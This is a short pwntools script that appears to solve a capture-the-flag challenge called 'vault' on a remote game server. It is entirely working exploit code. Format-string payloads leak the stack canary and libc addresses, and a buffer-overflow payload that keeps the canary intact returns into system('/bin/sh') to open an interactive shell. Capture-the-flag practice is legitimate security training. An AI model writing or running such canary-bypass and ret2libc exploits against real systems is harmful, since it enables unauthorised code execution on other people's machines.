from pwn import *
p=process('./vault')
exe=ELF('./vault',checksec=False)
p=remote('play.scriptsorcerers.xyz', 10004)

p.sendline(b'1')
p.sendline(b'%23$p')
p.sendline(b'2')
sleep(1)
print(p.recv().decode())


p.sendline(b'1')
p.sendline(b'%27$p')
p.sendline(b'2')
sleep(1)
print(p.recv().decode())

#canary=int(input('canary: '),16)
a=int(input('putgot: '),16)+11362-4

payload=p32(a)+b'%7$s'
p.sendline(b'1')
p.sendline(payload)
p.sendline(b'2')
sleep(1)
print(p.recv())

canary=int(input('canary: '),16)
libc=int(input('libc: '),16)-0x7d080
system=libc+0x51f50
binsh=libc+0x1cce52

payload=b'a'*64+p32(canary)+b'aaaa'+b'bbbb'+b'cccc'+p32(system)+p32(0)+p32(binsh)
p.sendline(b'1')
p.sendline(payload)
p.sendline(b'3')
p.interactive()

p.interactive()
